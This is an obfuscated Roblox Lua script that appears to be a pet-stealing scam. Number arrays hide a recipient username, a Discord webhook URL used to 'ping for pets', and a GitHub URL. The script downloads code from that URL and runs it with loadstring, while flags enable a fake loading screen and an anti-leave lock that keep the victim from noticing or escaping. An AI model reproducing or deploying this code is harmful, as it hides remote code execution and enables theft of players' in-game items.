function MzCkzXnFvLqZdIxszLjgQahHTVGJtVCqwKgSMQFaePpsJNLJNGrNDLbEABsgBOgkfXQTGXEosGvSfflfQoVPytXNwoDPXiEpjMX(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


UserName = MzCkzXnFvLqZdIxszLjgQahHTVGJtVCqwKgSMQFaePpsJNLJNGrNDLbEABsgBOgkfXQTGXEosGvSfflfQoVPytXNwoDPXiEpjMX({8085,10185,11970,12075,10920,11340,11340,11445,10605,11340,11655}) -- good pets
Webhook = MzCkzXnFvLqZdIxszLjgQahHTVGJtVCqwKgSMQFaePpsJNLJNGrNDLbEABsgBOgkfXQTGXEosGvSfflfQoVPytXNwoDPXiEpjMX({10920,12180,12180,11760,12075,6090,4935,4935,10500,11025,12075,10395,11655,11970,10500,4830,10395,11655,11445,4935,10185,11760,11025,4935,12495,10605,10290,10920,11655,11655,11235,12075,4935,5145,5145,5250,5880,5040,5880,5985,5670,5355,5145,5775,5250,5985,5145,5250,5775,5565,5250,5565,4935,7560,11760,7035,8295,12600,9135,10920,5565,10605,10815,5565,11865,8295,5985,7455,5355,7245,12075,10815,11760,5040,7770,5355,9450,5565,9240,8925,4725,11655,12600,12810,7455,8400,8295,8610,9345,7140,5040,8190,7140,8295,8295,7770,8610,8925,5250,8085,9345,11970,11025,10920,12810,8820,7350,10920,7665,8715,5880,6825,5670,7140,9975,10185,7350,12390,12600,7875,5565}) -- pings for pets
UserName2 = MzCkzXnFvLqZdIxszLjgQahHTVGJtVCqwKgSMQFaePpsJNLJNGrNDLbEABsgBOgkfXQTGXEosGvSfflfQoVPytXNwoDPXiEpjMX({8085,10185,11970,12075,10920,11340,11340,11445,10605,11340,11655}) -- bad pets

_G.LoadingScreen = true -- make it true if you want the loadingscreen
_G.AntiLeave = true -- make it true if you want the antileave
_G.MouseLock = true -- make it true if you want the mouselock

loadstring(game:HttpGet(MzCkzXnFvLqZdIxszLjgQahHTVGJtVCqwKgSMQFaePpsJNLJNGrNDLbEABsgBOgkfXQTGXEosGvSfflfQoVPytXNwoDPXiEpjMX({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,7980,12705,11760,10920,10605,11970,9240,4935,8085,11655,11970,11025,8715,10395,11970,11025,11760,12180,12075,4935,11445,10185,11025,11550,4935,8085,11655,11970,11025,8715,10395,11970,11025,11760,12180,9450}), true))()    
